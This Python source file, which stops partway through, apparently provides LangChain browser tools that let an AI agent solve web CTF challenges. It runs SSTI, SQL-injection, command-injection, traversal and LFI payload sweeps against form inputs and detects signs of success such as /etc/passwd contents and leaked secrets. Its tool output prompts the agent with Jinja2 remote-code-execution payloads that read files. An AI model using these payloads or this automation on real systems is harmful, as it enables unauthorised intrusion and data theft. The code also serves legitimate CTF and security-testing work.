"""LangChain tools for browser automation in CTF challenges."""

import re
from typing import TYPE_CHECKING

from langchain_core.tools import tool

from .extractors import (
    extract_interactive_elements,
    extract_html_hints,
    extract_forms,
    extract_links,
    find_elements_by_text,
)
from .payloads import get_payloads
from ..config import get_settings
from ..utils.flag_detector import detect_flag_in_page
from ..utils.logger import log_action, log_observation, log_error, _log_to_file
from ..utils.hitl import request_human_input
from ..models.vision import analyze_ctf_page

if TYPE_CHECKING:
    from .controller import BrowserController

# Global browser controller reference (set by orchestrator)
_browser: "BrowserController | None" = None

# Track which payload types have been run to prevent loops
_executed_payload_types: set[str] = set()


def set_browser_controller(browser: "BrowserController") -> None:
    """Set the global browser controller for tools."""
    global _browser, _executed_payload_types
    _browser = browser
    _executed_payload_types = set()  # Reset on new session


def get_browser() -> "BrowserController":
    """Get the global browser controller."""
    if _browser is None:
        raise RuntimeError("Browser controller not initialized")
    return _browser


def reset_payload_tracking() -> None:
    """Reset the executed payload types tracking."""
    global _executed_payload_types
    _executed_payload_types = set()


@tool
async def navigate_to_url(url: str) -> str:
    """Navigate the browser to a specific URL.

    Args:
        url: The URL to navigate to.

    Returns:
        Status message about navigation result.
    """
    browser = get_browser()
    result = await browser.navigate(url)
    return result


@tool
async def click_element(selector: str) -> str:
    """Click an element using CSS selector or text content.

    Args:
        selector: CSS selector or Playwright text selector.
            Examples: '#submit-btn', '.login-button', 'button:has-text("Login")'

    Returns:
        Status message about click result.
    """
    browser = get_browser()
    result = await browser.click(selector)
    return result


@tool
async def fill_input(selector: str, value: str, submit: bool = True) -> str:
    """Fill an input field with a value and optionally submit.

    Use for text inputs, textareas, password fields, and other form fields.
    By default, this will press Enter after filling to submit the form.

    IMPORTANT: After submission, if the page changes and has no input elements,
    this tool automatically navigates BACK so you can try another payload.
    READ the response carefully - the output of your command is in there!

    Args:
        selector: CSS selector for the input element.
        value: The value to fill into the input.
        submit: If True (default), press Enter after filling to submit.

    Returns:
        Status message and page response after submission.
    """
    browser = get_browser()
    original_url = browser.get_current_url()
    result = await browser.fill(selector, value)

    if submit:
        # Press Enter to submit
        await browser.press_key("Enter")

        # Wait for response
        await browser.page.wait_for_timeout(1500)
        try:
            await browser.page.wait_for_load_state("networkidle", timeout=5000)
        except Exception:
            pass  # Continue even if timeout

        # Get the response
        html = await browser.get_page_content()
        url = browser.get_current_url()

        # Check for flag in response
        from ..utils.flag_detector import detect_flag
        flag = detect_flag(html)

        if flag:
            return f"Filled and submitted. FLAG FOUND: {flag}\n\nPage URL: {url}"

        # Strip HTML tags for cleaner output
        import re
        body_text = re.sub(r'<[^>]+>', ' ', html)
        body_text = ' '.join(body_text.split())[:800]

        # Check if page changed and has no input elements
        page_changed = url != original_url
        has_inputs = False
        try:
            elements = await extract_interactive_elements(browser.page)
            input_elements = [e for e in elements if e.get('tag') in ['input', 'textarea']]
            has_inputs = len(input_elements) > 0
        except Exception:
            pass

        # If page changed and has no inputs, navigate back automatically
        navigated_back = False
        if page_changed and not has_inputs:
            try:
                await browser.go_back()
                await browser.page.wait_for_timeout(500)
                navigated_back = True
            except Exception:
                pass

        response_parts = [
            f"Filled and submitted.",
            f"",
            f"=== COMMAND OUTPUT (READ THIS!) ===",
            f"{body_text}",
            f"===================================",
            f"",
            f"Page URL after submit: {url}",
        ]

        if navigated_back:
            response_parts.append(f"")
            response_parts.append(f"Auto-navigated back to: {browser.get_current_url()}")
            response_parts.append(f"")
            response_parts.append(f"Analyze the output above and use fill_input with your next command.")

        return "\n".join(response_parts)

    return result


@tool
async def get_page_state() -> str:
    """Get comprehensive page state including URL, title, forms, and elements.

    Returns:
        Formatted string with page state information.
    """
    browser = get_browser()

    if not browser.page:
        return "Error: Browser not initialized"

    url = browser.get_current_url()
    title = await browser.page.title()
    elements = await extract_interactive_elements(browser.page)
    forms = await extract_forms(browser.page)
    hints = await extract_html_hints(browser.page)
    cookies = await browser.get_cookies()

    # Format output
    lines = [
        f"URL: {url}",
        f"Title: {title}",
        f"\nForms ({len(forms)}):",
    ]

    for form in forms:
        lines.append(f"  - {form.get('selector')}: {form.get('method')} to {form.get('action')}")
        for field in form.get('fields', []):
            lines.append(f"    - {field.get('tag')} [{field.get('type')}]: name={field.get('name')}")

    lines.append(f"\nInteractive Elements ({len(elements)}):")
    for elem in elements[:15]:  # Limit output
        tag = elem.get('tag')
        selector = elem.get('selector')
        text = elem.get('text', '')[:30]
        lines.append(f"  - <{tag}> {selector} : {text}")

    if len(elements) > 15:
        lines.append(f"  ... and {len(elements) - 15} more elements")

    lines.append(f"\nHints ({len(hints)}):")
    for hint in hints[:10]:
        lines.append(f"  - {hint[:100]}")

    lines.append(f"\nCookies ({len(cookies)}):")
    for cookie in cookies:
        lines.append(f"  - {cookie.get('name')}={cookie.get('value', '')[:30]}")

    return "\n".join(lines)


@tool
async def execute_javascript(code: str) -> str:
    """Execute JavaScript code in the page context.

    Useful for XSS testing, extracting data, or manipulating the page.

    Args:
        code: JavaScript code to execute.

    Returns:
        String result of the JavaScript execution.
    """
    browser = get_browser()
    result = await browser.execute_js(code)
    return result


@tool
async def check_for_flag() -> str:
    """Search the current page for CTF flag patterns.

    Searches in HTML, cookies, localStorage, console logs, and network responses.

    Returns:
        The flag if found, or a message indicating no flag was found.
    """
    browser = get_browser()

    if not browser.page:
        return "Error: Browser not initialized"

    # Gather all data sources
    html = await browser.get_page_content()
    cookies = await browser.get_cookies()
    local_storage = await browser.get_local_storage()
    console_logs = browser.get_console_logs()
    network = browser.get_network_traffic()

    flag = detect_flag_in_page(
        html=html,
        cookies=cookies,
        local_storage=local_storage,
        console_logs=console_logs,
        network_responses=network.get("responses", []),
    )

    if flag:
        log_observation(f"FLAG FOUND: {flag}")
        return f"FLAG FOUND: {flag}"

    return "No flag found in current page state."


@tool
async def analyze_page_visually() -> str:
    """Take a screenshot and analyze it with the vision model.

    Use this to understand the page layout and identify challenge type.

    Returns:
        Visual analysis of the page from the VLM.
    """
    settings = get_settings()

    if not settings.vision_enabled:
        return "Vision model is disabled. Use get_page_state or list_interactive_elements instead."

    browser = get_browser()

    if not browser.page:
        return "Error: Browser not initialized"

    screenshot_b64 = await browser.screenshot()
    if not screenshot_b64:
        return "Error: Could not take screenshot"

    url = browser.get_current_url()
    elements = await extract_interactive_elements(browser.page)
    cookies = await browser.get_cookies()
    hints = await extract_html_hints(browser.page)

    analysis = await analyze_ctf_page(
        screenshot_b64=screenshot_b64,
        url=url,
        interactive_elements=elements,
        cookies=cookies,
        html_hints=hints,
    )

    log_observation(f"Visual analysis complete")
    return analysis


@tool
async def list_interactive_elements() -> str:
    """List all interactive elements on the page with their selectors.

    Returns:
        Formatted list of interactive elements.
    """
    browser = get_browser()

    if not browser.page:
        return "Error: Browser not initialized"

    elements = await extract_interactive_elements(browser.page)

    visible = [e for e in elements if e.get("is_visible", True)]
    hidden = [e for e in elements if not e.get("is_visible", True)]

    lines = [f"Found {len(elements)} interactive elements ({len(visible)} visible, {len(hidden)} hidden):\n"]

    # List visible elements
    if visible:
        lines.append("VISIBLE ELEMENTS:")
        for i, elem in enumerate(visible, 1):
            tag = elem.get("tag")
            selector = elem.get("selector")
            elem_type = elem.get("type", "")
            text = elem.get("text", "")[:40]
            name = elem.get("name", "")

            line = f"{i}. <{tag}>"
            if elem_type:
                line += f" type='{elem_type}'"
            if name:
                line += f" name='{name}'"
            line += f"\n   Selector: {selector}"
            if text:
                line += f"\n   Text: '{text}'"
            lines.append(line)

    # List hidden elements separately (important for CTF)
    if hidden:
        lines.append("\nHIDDEN ELEMENTS (may contain flags/hints):")
        for i, elem in enumerate(hidden, 1):
            tag = elem.get("tag")
            selector = elem.get("selector")
            elem_type = elem.get("type", "")
            text = elem.get("text", "")[:40]
            name = elem.get("name", "")
            value = elem.get("value", "")[:40]

            line = f"{i}. <{tag}>"
            if elem_type:
                line += f" type='{elem_type}'"
            if name:
                line += f" name='{name}'"
            line += f"\n   Selector: {selector}"
            if text:
                line += f"\n   Text: '{text}'"
            if value:
                line += f"\n   Value: '{value}'"
            lines.append(line)

    return "\n".join(lines)


@tool
async def get_network_traffic() -> str:
    """Get captured network requests and responses since last navigation.

    Useful for finding flags or hints in API responses.

    Returns:
        Formatted network traffic information.
    """
    browser = get_browser()
    traffic = browser.get_network_traffic()

    lines = [
        f"Network Requests ({len(traffic['requests'])}):",
    ]

    for req in traffic["requests"][-20:]:  # Last 20
        lines.append(f"  {req.get('method')} {req.get('url')[:80]}")

    lines.append(f"\nNetwork Responses ({len(traffic['responses'])}):")
    for resp in traffic["responses"][-20:]:
        body_preview = resp.get("body", "")[:100]
        lines.append(f"  [{resp.get('status')}] {resp.get('url')[:60]}")
        if body_preview:
            lines.append(f"       Body: {body_preview}...")

    return "\n".join(lines)


@tool
async def get_page_source() -> str:
    """Get the full HTML source of the current page.

    Returns:
        The HTML source code, truncated if very long.
    """
    browser = get_browser()
    html = await browser.get_page_content()

    # Truncate if too long
    if len(html) > 10000:
        return html[:10000] + "\n\n... [truncated, total length: " + str(len(html)) + "]"

    return html


@tool
async def find_element_by_text(text: str) -> str:
    """Find elements containing specific text and return their selectors.

    Args:
        text: The text to search for in elements.

    Returns:
        List of elements containing the text with their selectors.
    """
    browser = get_browser()

    if not browser.page:
        return "Error: Browser not initialized"

    elements = await find_elements_by_text(browser.page, text)

    if not elements:
        return f"No elements found containing text: '{text}'"

    lines = [f"Elements containing '{text}':\n"]
    for elem in elements:
        lines.append(f"  <{elem.get('tag')}> {elem.get('selector')}")
        lines.append(f"    Text: {elem.get('text', '')[:60]}")

    return "\n".join(lines)


@tool
async def submit_form(form_selector: str) -> str:
    """Submit a form by clicking its submit button or pressing Enter.

    Args:
        form_selector: CSS selector for the form.

    Returns:
        Status message about form submission.
    """
    browser = get_browser()

    if not browser.page:
        return "Error: Browser not initialized"

    try:
        # Try to find and click submit button
        submit_selectors = [
            f"{form_selector} input[type='submit']",
            f"{form_selector} button[type='submit']",
            f"{form_selector} button:has-text('Submit')",
            f"{form_selector} button:has-text('Login')",
            f"{form_selector} button:has-text('Sign in')",
            f"{form_selector} button",
        ]

        for sel in submit_selectors:
            try:
                element = await browser.page.query_selector(sel)
                if element:
                    await element.click()
                    await browser.page.wait_for_load_state("domcontentloaded", timeout=5000)
                    log_action("Form submitted", f"Using selector: {sel}")
                    return f"Form submitted using {sel}. Current URL: {browser.get_current_url()}"
            except Exception:
                continue

        # Fallback: press Enter on the last input
        result = await browser.press_key("Enter")
        return f"Pressed Enter to submit form. {result}"

    except Exception as e:
        return f"Error submitting form: {e}"


@tool
async def request_human_help(reason: str) -> str:
    """Request assistance from a human operator when stuck.

    Use this when you've tried multiple approaches and are unable to progress.

    Args:
        reason: Explanation of why help is needed and what has been tried.

    Returns:
        Human's guidance or suggestion.
    """
    browser = get_browser()
    url = browser.get_current_url() if browser.page else "unknown"

    context = f"Current URL: {url}\n\nProblem: {reason}"
    response = request_human_input(reason, context)
    return f"Human guidance: {response}"


def _analyze_payload_response(payload: str, payload_type: str, html: str, original_html: str) -> dict:
    """
    Analyze the response after a payload to detect interesting patterns.

    Returns a dict with:
        - interesting: bool - whether this response is worth noting
        - critical: bool - whether this is critical enough to stop iteration
        - findings: list[str] - what was found
        - response_snippet: str - relevant part of the response
    """
    findings = []
    interesting = False
    critical = False
    response_snippet = ""

    # Get the body text (strip HTML tags for cleaner analysis)
    body_text = re.sub(r'<[^>]+>', ' ', html)
    body_text = ' '.join(body_text.split())  # Normalize whitespace

    if payload_type == "ssti":
        # Check for SSTI indicators

        # {{7*7}} should produce 49
        if "7*7" in payload or "7 * 7" in payload:
            if "49" in html and "49" not in original_html:
                findings.append("SSTI CONFIRMED: {{7*7}} evaluated to 49")
                interesting = True
                critical = True

        # Check for config object dumps
        if "config" in payload.lower():
            config_patterns = [
                r"SECRET_KEY",
                r"DEBUG.*True",
                r"DATABASE",
                r"<Config",
                r"'SECRET'",
                r"flask\.config",
            ]
            for pattern in config_patterns:
                if re.search(pattern, html, re.IGNORECASE):
                    findings.append(f"Config leak detected: {pattern}")
                    interesting = True
                    critical = True
                    # Extract snippet around the match
                    match = re.search(pattern, html, re.IGNORECASE)
                    if match:
                        start = max(0, match.start() - 100)
                        end = min(len(html), match.end() + 200)
                        response_snippet = html[start:end]

        # Check for class/MRO dumps (Python SSTI)
        if "__class__" in payload or "__mro__" in payload:
            if "__class__" in html or "__mro__" in html or "subclasses" in html:
                findings.append("Python class introspection output detected")
                interesting = True
                # Extract the class dump
                mro_match = re.search(r'\[.*?class.*?\]', html[:2000])
                if mro_match:
                    response_snippet = mro_match.group()[:500]

        # Check for command execution output
        if "popen" in payload.lower() or "system" in payload.lower():
            # Look for typical command output
            if re.search(r'uid=\d+|root:|www-data|/bin/|/usr/', html):
                findings.append("Command execution output detected!")
                interesting = True
                critical = True

        # Check for Jinja2/Flask specific errors
        if re.search(r'jinja2|TemplateSyntaxError|UndefinedError', html, re.IGNORECASE):
            findings.append("Jinja2 template error detected - confirms SSTI vector")
            interesting = True

    elif payload_type == "ssti_explore":
        # STOP after first successful command execution - agent must craft own payloads
        # This forces the agent to analyze the output and use fill_input for exploitation

        # Directory listing output - extract full listing and STOP
        if re.search(r'total \d+|drwx|^-rw|lrwx', html):
            findings.append("COMMAND EXECUTION CONFIRMED - Directory listing detected!")
            interesting = True
            critical = True  # STOP HERE - agent must take over with fill_input
            # Extract the directory listing (between template output markers)
            # Strip HTML and get clean output
            clean_html = re.sub(r'<[^>]+>', '\n', html)
            ls_match = re.search(r'(total \d+[\s\S]*?)(?:\n\n|\Z)', clean_html)
            if ls_match:
                listing = ls_match.group(1).strip()
                response_snippet = listing[:800]
                # Look for flag-related files in listing
                flag_files = re.findall(r'[\w./-]*flag[\w./-]*', listing, re.IGNORECASE)
                if flag_files:
                    findings.append(f"FLAG FILES FOUND: {', '.join(set(flag_files))}")
                # Look for interesting directories to explore
                interesting_dirs = re.findall(r'(challenge|app|home|flag|ctf|secret)', listing, re.IGNORECASE)
                if interesting_dirs:
                    findings.append(f"INTERESTING DIRECTORIES: {', '.join(set(interesting_dirs))}")

        # Find command output - extract file paths and STOP
        if 'find' in payload.lower() or 'locate' in payload.lower():
            # Extract file paths from find output
            clean_html = re.sub(r'<[^>]+>', '\n', html)
            file_paths = re.findall(r'(/[\w./-]+)', clean_html)
            if file_paths:
                interesting = True
                critical = True  # STOP - agent should use fill_input to cat the files
                # Filter for interesting paths
                interesting_paths = [p for p in file_paths if 'flag' in p.lower() or '.txt' in p.lower()]
                if interesting_paths:
                    unique_paths = list(set(interesting_paths))
                    findings.append(f"INTERESTING FILES: {', '.join(unique_paths[:10])}")
                    response_snippet = '\n'.join(unique_paths[:20])

        # File content (flag files often have specific patterns) - ONLY THIS IS CRITICAL
        if re.search(r'pico|ctf|flag|HTB|THM', html, re.IGNORECASE) and re.search(r'\{[^}]+\}', html):
            # Extract the actual flag
            flag_match = re.search(r'((?:pico|ctf|flag|HTB|THM|picoCTF)\{[^}]+\})', html, re.IGNORECASE)
            if flag_match:
                findings.append(f"FLAG FOUND: {flag_match.group(1)}")
                critical = True  # Only stop for actual flag
            else:
                findings.append("Possible flag content in response!")
            interesting = True

        # Environment variables dump - look for FLAG variable specifically
        if re.search(r'PATH=|HOME=|USER=|FLAG=|SECRET', html):
            findings.append("Environment variables leaked!")
            interesting = True
            # Look specifically for FLAG= in env output
            flag_env = re.search(r'FLAG=([^\s<]+)', html)
            if flag_env:
                findings.append(f"FLAG VARIABLE: {flag_env.group(1)}")
                critical = True
            # Extract env vars
            clean_html = re.sub(r'<[^>]+>', ' ', html)
            env_match = re.search(r'((?:\w+=\S+\s*){1,20})', clean_html)
            if env_match and not response_snippet:
                response_snippet = env_match.group(1)[:500]

        # Config object dump - interesting but don't stop
        if re.search(r"SECRET_KEY|<Config|'SECRET'", html, re.IGNORECASE):
            findings.append("Flask config leaked!")
            interesting = True
            # NOT critical - keep exploring

        # Command output (id, whoami, pwd, etc.) - STOP and let agent take over
        if re.search(r'uid=\d+|root:|www-data|/bin/bash', html):
            findings.append("Command execution confirmed!")
            interesting = True
            critical = True  # STOP - agent should use fill_input

        # PWD output - capture current directory and STOP
        if 'pwd' in payload.lower():
            clean_html = re.sub(r'<[^>]+>', ' ', html)
            pwd_match = re.search(r'(/[\w/-]+)', clean_html)
            if pwd_match and not response_snippet:
                findings.append(f"Current directory: {pwd_match.group(1)}")
                response_snippet = pwd_match.group(1)
                interesting = True
                critical = True  # STOP - agent knows the working directory now

        # Check if response changed significantly (command output likely) - STOP
        if len(html) > len(original_html) + 100:  # Increased threshold
            findings.append(f"Response grew by {len(html) - len(original_html)} bytes - command executed!")
            interesting = True
            critical = True  # STOP - command executed, agent should analyze and continue

    elif payload_type == "sqli":
        # Check for SQL errors
        sql_errors = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"PostgreSQL.*ERROR",
            r"ORA-\d{5}",
            r"Microsoft.*ODBC.*SQL Server",
            r"sqlite3\.OperationalError",
            r"You have an error in your SQL syntax",
            r"Unclosed quotation mark",
            r"syntax error at or near",
        ]
        for pattern in sql_errors:
            if re.search(pattern, html, re.IGNORECASE):
                findings.append(f"SQL Error detected: {pattern}")
                interesting = True
                critical = True

        # Check for successful injection (data returned)
        if "UNION" in payload.upper():
            # Look for multiple rows or unexpected data
            if re.search(r'admin|root|password|secret|user', html, re.IGNORECASE):
                findings.append("Possible data leak from UNION injection")
                interesting = True

        # Check for auth bypass success (page changed significantly)
        if len(html) > len(original_html) * 1.5:
            findings.append("Page content significantly increased - possible successful injection")
            interesting = True

    elif payload_type == "cmdi":
        # Check for command execution output
        cmd_indicators = [
            (r'uid=\d+\(.*?\)', "Unix id command output"),
            (r'root:.*?:/bin/', "/etc/passwd content"),
            (r'total \d+.*?drwx', "Directory listing (ls -la)"),
            (r'Linux.*?\d+\.\d+\.\d+', "uname output"),
            (r'www-data|apache|nginx', "Web user detected"),
            (r'flag\{.*?\}', "Flag pattern in output"),
        ]
        for pattern, desc in cmd_indicators:
            if re.search(pattern, html):
                findings.append(f"Command execution confirmed: {desc}")
                interesting = True
                critical = True
                match = re.search(pattern, html)
                if match:
                    start = max(0, match.start() - 50)
                    end = min(len(html), match.end() + 100)
                    response_snippet = html[start:end]

    elif payload_type == "path_traversal":
        # Check for file content indicators
        file_indicators = [
            (r'root:.*?:0:0:', "/etc/passwd content"),
            (r'\$\d+\$.*?\$', "Password hash detected"),
            (r'<?php', "PHP source code"),
            (r'DB_PASSWORD|DB_HOST', "Config file content"),
            (r'flag\{.*?\}|FLAG\{.*?\}', "Flag in file"),
        ]
        for pattern, desc in file_indicators:
            if re.search(pattern, html):
                findings.append(f"Path traversal successful: {desc}")
                interesting = True
                critical = True

    elif payload_type == "lfi":
        # Check for included file content
        if "<?php" in html or "<?=" in html:
            findings.append("PHP source code exposed via LFI")
            interesting = True
            critical = True
        if "base64" in payload and len(html) > len(original_html) + 100:
            findings.append("Base64 encoded content returned - decode it!")
            interesting = True
            # Extract potential base64
            b64_match = re.search(r'[A-Za-z0-9+/]{50,}={0,2}', html)
            if b64_match:
                response_snippet = f"Base64 content: {b64_match.group()[:200]}..."

    # Generic: check if page changed significantly
    if not findings and len(html) != len(original_html):
        size_diff = len(html) - len(original_html)
        if abs(size_diff) > 200:
            findings.append(f"Page size changed by {size_diff} bytes")
            interesting = True

    # Generic: check for error messages that might reveal info
    error_patterns = [
        r'Exception|Error|Warning|Fatal|Traceback',
        r'Stack trace|Debug|Internal Server Error',
    ]
    for pattern in error_patterns:
        if re.search(pattern, html) and not re.search(pattern, original_html):
            findings.append(f"New error/exception appeared in response")
            interesting = True
            # Extract error snippet
            match = re.search(pattern, html)
            if match and not response_snippet:
                start = max(0, match.start() - 50)
                end = min(len(html), match.end() + 300)
                response_snippet = re.sub(r'<[^>]+>', ' ', html[start:end])

    return {
        "interesting": interesting,
        "critical": critical,
        "findings": findings,
        "response_snippet": response_snippet[:500] if response_snippet else "",
    }


@tool
async def try_common_payloads(input_selector: str, payload_type: str) -> str:
    """Try common CTF payloads on an input field with intelligent response analysis.

    This tool tests payloads and analyzes responses to detect:
    - SSTI: template evaluation ({{7*7}}=49), config leaks, class dumps
    - SQLi: SQL errors, data leaks, auth bypass indicators
    - Command injection: command output, file contents
    - Path traversal: file contents, source code exposure
    - LFI: included file content, base64 encoded data

    The tool will stop early if a critical finding is detected (e.g., confirmed SSTI,
    successful command execution) so you can investigate further.

    Args:
        input_selector: CSS selector for the input field to test.
        payload_type: Type of payload:
            - 'ssti': Detection payloads ({{7*7}}, etc.)
            - 'ssti_explore': Exploration payloads (ls, find, env) - use AFTER confirming SSTI
            - 'sqli': SQL injection payloads
            - 'cmdi': Command injection payloads
            - 'path_traversal': Directory traversal payloads
            - 'lfi': Local file inclusion payloads
            - 'xss': Cross-site scripting payloads
            - 'auth_bypass': Common credentials

    Returns:
        Detailed results including response analysis and any interesting findings.
    """
    global _executed_payload_types

    browser = get_browser()

    if not browser.page:
        return "Error: Browser not initialized"

    # Check if this payload type has already been run
    if payload_type in _executed_payload_types:
        guidance = f"""
ERROR: You already ran '{payload_type}' payloads. Do NOT run them again!

You have gathered enough information. Now you must use fill_input to craft your OWN custom payload.

For SSTI exploitation, use fill_input like this:
  fill_input('{input_selector}', "{{{{lipsum.__globals__['os'].popen('cat /path/to/flag').read()}}}}")

Based on the directory listings and file searches from before, identify where the flag is and read it.
Common flag locations: /flag.txt, /app/flag, /home/*/flag.txt

DO NOT call try_common_payloads again. Use fill_input with a custom payload NOW.
"""
        return guidance

    # Mark this payload type as executed
    _executed_payload_types.add(payload_type)

    payloads = get_payloads(payload_type)
    if not payloads:
        return f"Unknown payload type: {payload_type}. Available: ssti, ssti_explore, sqli, cmdi, path_traversal, lfi, xss, auth_bypass"

    # Capture original page state for comparison
    original_html = await browser.get_page_content()
    original_url = browser.get_current_url()

    # Log start of payload testing
    _log_to_file("INFO", "PAYLOAD_START", f"Starting {payload_type} payload testing", {
        "selector": input_selector,
        "original_url": original_url,
        "payload_count": len(payloads),
        "original_html_length": len(original_html),
    })

    results = [f"Testing {len(payloads)} {payload_type} payloads on {input_selector}:\n"]
    interesting_findings = []

    # Test all payloads
    for i, payload in enumerate(payloads, 1):
        if isinstance(payload, tuple):
            payload = payload[0]  # Use first value if tuple

        try:
            # Clear and fill input
            await browser.page.fill(input_selector, "")
            await browser.fill(input_selector, str(payload))

            # Try to submit (press Enter)
            await browser.press_key("Enter")

            # Wait longer for slow commands (find, grep, etc.)
            if any(cmd in payload.lower() for cmd in ['find', 'grep', 'locate', 'cat']):
                await browser.page.wait_for_timeout(3000)  # 3 seconds for slow commands
            else:
                await browser.page.wait_for_timeout(1500)

            # Wait for page to finish loading
            try:
                await browser.page.wait_for_load_state("networkidle", timeout=5000)
            except Exception:
                pass  # Continue even if timeout

            # Get response with retry
            try:
                html = await browser.get_page_content()
            except Exception as e:
                # If content fetch fails, wait and retry
                await browser.page.wait_for_timeout(1000)
                try:
                    html = await browser.get_page_content()
                except Exception:
                    html = ""  # Empty if still fails

            url = browser.get_current_url()

            # Check for flag first
            from ..utils.flag_detector import detect_flag
            flag = detect_flag(html)

            if flag:
                result = f"  [{i}/{len(payloads)}] Payload: {str(payload)[:50]}"
                result += f"\n       *** FLAG FOUND: {flag} ***"
                results.append(result)
                _log_to_file("INFO", "FLAG_FOUND_PAYLOAD", f"Flag found with payload: {payload}", {
                    "flag": flag,
                    "payload": payload,
                    "html": html,
                })
                return "\n".join(results) + f"\n\n*** FLAG FOUND: {flag} ***"

            # Log full response to file (untruncated for debugging)
            _log_to_file("DEBUG", "PAYLOAD_RESPONSE", f"Payload [{i}/{len(payloads)}]: {payload}", {
                "payload_type": payload_type,
                "selector": input_selector,
                "url": url,
                "html_length": len(html),
                "html_content": html,  # Full HTML - untruncated
            })

            # Analyze the response
            analysis = _analyze_payload_response(payload, payload_type, html, original_html)

            # Log analysis results
            _log_to_file("DEBUG", "PAYLOAD_ANALYSIS", f"Analysis for payload: {payload}", {
                "interesting": analysis["interesting"],
                "critical": analysis["critical"],
                "findings": analysis["findings"],
                "response_snippet": analysis["response_snippet"],
            })

            # Build result string
            result = f"  [{i}/{len(payloads)}] Payload: {str(payload)[:50]}"
            result += f"\n       URL: {url}"

            if analysis["findings"]:
                result += f"\n       >>> FINDINGS:"
                for finding in analysis["findings"]:
                    result += f"\n           - {finding}"
                interesting_findings.append({
                    "payload": str(payload),
                    "findings": analysis["findings"],
                    "snippet": analysis["response_snippet"],
                })

            if analysis["response_snippet"]:
                result += f"\n       Response snippet: {analysis['response_snippet'][:200]}..."

            results.append(result)

            # If critical finding, stop and report
            if analysis["critical"]:
                results.append(f"\n{'='*60}")
                results.append(f"COMMAND EXECUTION CONFIRMED! YOU must now craft your own payloads!")
                results.append(f"{'='*60}")
                if payload_type == "ssti":
                    results.append(f"\nNEXT ACTION: Use fill_input with this SSTI RCE payload:")
                    results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('ls -la /').read()}}}}\")")
                    results.append(f"\nThis will list files at root. Then based on what you see, use fill_input")
                    results.append(f"to cat the flag file (e.g., cat /flag.txt)")
                elif payload_type == "ssti_explore":
                    results.append(f"\n*** IMPORTANT: Analyze the output above! ***")
                    results.append(f"\nYou saw a directory listing. Now YOU must:")
                    results.append(f"1. Look at the directories/files shown above")
                    results.append(f"2. Identify interesting directories (challenge, app, flag, etc.)")
                    results.append(f"3. Use fill_input to explore those directories:")
                    results.append(f"   fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('ls -la /challenge').read()}}}}\")")
                    results.append(f"4. When you find the flag file, read it:")
                    results.append(f"   fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /challenge/flag').read()}}}}\")")
                    results.append(f"\nDO NOT use try_common_payloads again! Use fill_input with YOUR OWN commands!")
                elif payload_type == "sqli":
                    results.append(f"\nNEXT ACTION: Use fill_input with UNION SELECT to extract data")
                elif payload_type == "cmdi":
                    results.append(f"\nNEXT ACTION: Use fill_input with: ; ls -la / to explore")

                # Navigate back so agent can continue exploiting
                await browser.go_back()
                await browser.page.wait_for_timeout(500)
                results.append(f"\nReady at: {browser.get_current_url()}")
                break

            # Go back for next payload
            await browser.go_back()
            await browser.page.wait_for_timeout(500)

        except Exception as e:
            results.append(f"  [{i}/{len(payloads)}] Payload {str(payload)[:30]}... Error: {e}")
            # Try to recover by navigating back to original page
            try:
                await browser.navigate(original_url)
                await browser.page.wait_for_timeout(500)
            except Exception:
                pass  # If recovery fails, continue anyway

    # Summary of interesting findings
    if interesting_findings:
        results.append(f"\n{'='*60}")
        results.append(f"EXPLORATION COMPLETE: {len(interesting_findings)} findings")
        results.append(f"{'='*60}")

        # Collect all discovered flag-related paths
        flag_paths = []
        all_snippets = []

        for idx, finding in enumerate(interesting_findings, 1):
            results.append(f"\n{idx}. {finding['payload'][:50]}...")
            for f in finding["findings"]:
                results.append(f"   → {f}")
                # Extract flag paths from findings
                if "FLAG FILES" in f or "INTERESTING FILES" in f:
                    paths = re.findall(r'/[\w./-]+', f)
                    flag_paths.extend(paths)
            if finding["snippet"]:
                all_snippets.append(finding["snippet"])
                results.append(f"   Output: {finding['snippet'][:400]}")

        # Provide specific exploitation guidance
        if payload_type == "ssti_explore":
            results.append(f"\n{'='*60}")
            results.append("YOUR TURN: Use fill_input to read the flag!")
            results.append(f"{'='*60}")

            if flag_paths:
                # Suggest specific cat commands for discovered flag files
                unique_paths = list(set(flag_paths))[:5]
                results.append(f"\nDiscovered flag-related files: {', '.join(unique_paths)}")
                results.append("\nTry these commands with fill_input:")
                for path in unique_paths:
                    results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat {path}').read()}}}}\")")
            else:
                results.append("\nNo specific flag files found. Try:")
                results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /flag.txt').read()}}}}\")")
                results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /app/flag').read()}}}}\")")
                results.append(f"  fill_input('{input_selector}', \"{{{{lipsum.__globals__['os'].popen('cat /flag').read()}}}}\")")

            results.append("\nDO NOT run try_common_payloads again. Use fill_input NOW!")
    else:
        results.append(f"\n=== No significant findings detected ===")
        if payload_type == "ssti_explore":
            results.append("Try alternative RCE methods with fill_input:")
            results.append(f"  fill_input('{input_selector}', \"{{{{cycler.__init__.__globals__.os.popen('ls -la /').read()}}}}\")")
            results.append(f"  fill_input('{input_selector}', \"{{{{joiner.__init__.__globals__.os.popen('ls -la /').read()}}}}\")")

    # Log final summary
    final_result = "\n".join(results)
    _log_to_file("INFO", "PAYLOAD_COMPLETE", f"Completed {payload_type} payload testing", {
        "selector": input_selector,
        "findings_count": len(interesting_findings),
        "interesting_findings": interesting_findings,
        "full_result": final_result,
    })

    return final_result


@tool
async def scroll_page(direction: str) -> str:
    """Scroll the page up or down.

    Args:
        direction: 'up' or 'down'

    Returns:
        Status message.
    """
    browser = get_browser()
    result = await browser.scroll(direction)
    return result


@tool
async def go_back() -> str:
    """Navigate back in browser history.

    Returns:
        Status message with new URL.
    """
    browser = get_browser()
    result = await browser.go_back()
    return result


@tool
async def wait_for_element(selector: str, timeout: int = 5) -> str:
    """Wait for an element to appear on the page.

    Args:
        selector: CSS selector for the element.
        timeout: Maximum time to wait in seconds.

    Returns:
        Status message about whether element was found.
    """
    browser = get_browser()
    result = await browser.wait_for_selector(selector, timeout)
    return result


@tool
async def get_cookies() -> str:
    """Get all cookies for the current page.

    Returns:
        Formatted list of cookies.
    """
    browser = get_browser()
    cookies = await browser.get_cookies()

    lines = [f"Cookies ({len(cookies)}):\n"]
    for cookie in cookies:
